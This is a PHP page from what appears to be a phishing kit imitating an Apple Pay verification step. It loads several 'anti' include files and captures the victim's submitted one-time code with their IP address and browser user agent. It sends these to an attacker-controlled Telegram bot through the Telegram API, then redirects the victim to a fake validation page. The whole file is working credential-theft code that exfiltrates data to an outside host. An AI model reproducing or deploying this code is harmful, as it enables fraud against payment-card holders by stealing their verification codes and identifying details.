<?php
session_start();
include('../email.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');


$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = htmlspecialchars($_POST['code'], ENT_QUOTES, 'UTF-8'); // Sécurisation de l'entrée utilisateur

    if (empty($code)) {
        header('Location: code.php?error=true&' . uniqid(rand(), true));
        exit;
    } else {
        $message = "
            🗃[Apple Pay]
📄 Code : $code

📀 IP ADRESS : ".$_SESSION['ip']."
📀 USER-AGENT : ".$_SESSION['useragent']."
        ";

        $subject = "=?utf-8?Q?=E3=80=8C=F0=9F=97=82=E3=80=8D=2B1_CODE?= - " . $_SESSION['ip'];
        $headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";
        $data = [
            'text' => $message,
            'chat_id' => $chat_id
        ];
        
        // Envoi au bot Telegram
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));

        // Redirection après traitement
        header('Location: ../bnss/validation.php');
        exit;
    }
}
?>
